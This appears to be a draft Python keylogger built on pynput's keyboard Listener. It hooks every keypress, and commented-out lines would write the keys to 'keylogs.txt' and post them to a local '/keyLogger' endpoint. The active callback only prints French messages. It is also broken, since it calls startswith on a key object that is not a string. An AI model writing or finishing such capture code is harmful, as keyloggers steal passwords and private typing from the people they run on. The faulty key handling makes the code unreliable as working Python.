from pynput.keyboard import Listener
# import requests
# url = "http://localhost:3000/keyLogger"
log_file="keylogs.txt"
# data = {
#     "characters": "MyCharacteres"
# }
def on_press(key):
    if (key.startswith("Key.")):
        # with open(log_file,"a") as f:
        print("La chaîne commence par 'Key.'")
    else:
        print("La chaîne ne commence pas par 'Key.'")


            # f.write(f'{key}'.replace(key," "))
            # f.write(f'{key}'.replace("Key.",""))

with Listener(on_press=on_press) as listener:
    listener.join()
